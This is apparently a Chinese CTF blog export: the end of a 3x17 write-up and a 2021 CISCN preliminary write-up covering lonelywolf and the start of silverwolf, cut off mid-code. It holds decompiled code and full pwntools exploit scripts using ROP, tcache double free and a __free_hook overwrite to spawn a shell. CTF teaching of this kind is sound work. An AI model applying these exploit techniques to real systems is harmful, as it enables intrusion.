0x4b40f0)</span><br><span class="line">call   qword ptr [rbp + rbx*8] &lt;0x401580&gt;</span><br><span class="line">     ↓</span><br><span class="line">mov   rsp,rbp;rsp =&gt; 0x4b40f0</span><br><span class="line">pop    ebp    ;rsp =&gt; 0x4b40f8</span><br><span class="line">ret    ;rsp =&gt; 0x4b4100</span><br></pre></td></tr></table></figure><p>此时，<code>rsp</code>的值已经到<code>0x4b4100</code>这个位置，那我们只要在此处布置好<code>ROP+</code>栈迁移，等待<code>ret</code>返回，就可以劫持控制流了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">write(esp,p64(pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(exe_call))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(syscall))</span><br><span class="line">write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;3x17&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;3x17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">exe_call = <span class="number">0x3b</span></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line">syscall = <span class="number">0x471db5</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B4200</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="built_in">str</span>(addr))</span><br><span class="line">io.recv()</span><br><span class="line">io.send(data)</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line">write(esp,p64(pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(exe_call))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(syscall))</span><br><span class="line">write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.freebuf.com/articles/system/226003.html">https://www.freebuf.com/articles/system/226003.html</a></p><p><a href="https://www.mrskye.cn/archives/2a024e">https://www.mrskye.cn/archives/2a024e</a></p><span id="more"></span><p>本文由<strong>12138</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/254520">https://www.anquanke.com/post/id/254520</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021·CISCN国赛初赛WP</title>
      <link href="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/"/>
      <url>/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2021·CISCN国赛初赛WP"><a href="#2021·CISCN国赛初赛WP" class="headerlink" title="2021·CISCN国赛初赛WP"></a>2021·CISCN国赛初赛WP</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/10.png" class=""><p>保护全开，并且是在<code>libc-2.27.so</code>，含有<code>tache bin</code></p><p>alloc没啥，挺常规的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;size);   <span class="comment">//index得等于0</span></span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(&amp;unk_F44, &amp;size);</span><br><span class="line">    v1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )                          <span class="comment">// 不能分配超过0x78的块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        chunk_size = v1;</span><br><span class="line">        chunk_ptr = v2;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆块的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    chunk_size;</span><br><span class="line">    chunk_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点在这，由于tache的缘故导致uaf漏洞更加好利用了…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk_ptr )</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr);                            <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有清零<code>chunk_ptr</code>，导致被free的chunk也能show</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk_ptr )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit很常规，并没有<code>off-by-one</code>，但是由于<code>chunk_ptr</code>没有置零所以可以随便写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = chunk_ptr;</span><br><span class="line">      <span class="keyword">if</span> ( chunk_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="keyword">char</span> *)chunk_ptr + chunk_size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这得先泄露<code>heap_base</code>和<code>libc_base</code>，前者为了劫持<code>tache</code> 控制堆块，后者为了<code>one_gadget</code></p><p>泄露也很简单，通过改变key来<code>double free</code>，<code>tache</code>的出现让<code>double free</code>变得异常简单，连堆块的大小都不用检查了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>直接show就能泄露堆地址了</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/11.png" class=""><p>泄露了堆的基地址之后呢，我们就可以修改<code>tache bin</code>的fd来劫持tache 控制堆块，add两次我们就得到了控制堆块，通过写让它以往0x250的堆块已经满了，然后把这个控制堆块free掉就能进入<code>unsorted bin</code>里面，之后show除了就能得到libc的基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/12.png" class=""><p>之后再此往控制堆块里面写入<code>__free_hook</code>的地址，再add出来就能写它为<code>one_gadget</code>了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x03&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x3f</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/13.png" class=""><p>getshell！</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;lonelywolf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;lonelywolf&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x260</span></span><br><span class="line">log.success(<span class="string">&quot;[*]heap_base =&gt; &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">payload = p64(heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span> -<span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;[*]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x03&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x3f</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5</span></span><br><span class="line"><span class="string">0x4f432</span></span><br><span class="line"><span class="string">0x10a41c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h3><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/2.png" class=""><p>保护全开</p><p>在初始化的时候是开了沙箱的</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/1.png" class=""><p>拿工具扫一下，只能用ORW三个系统调用，ORW没跑了</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/3.png" class=""><p>和上题相比就是多了一个沙箱，这里只列出<code>alloc</code>，<code>free</code>函数</p><p>alloc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_1144, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( !size )<span class="comment">//index还是得等于0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(&amp;unk_1144, &amp;size);</span><br><span class="line">    size_1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )<span class="comment">//只能申请小于0x78大小的堆块</span></span><br><span class="line">    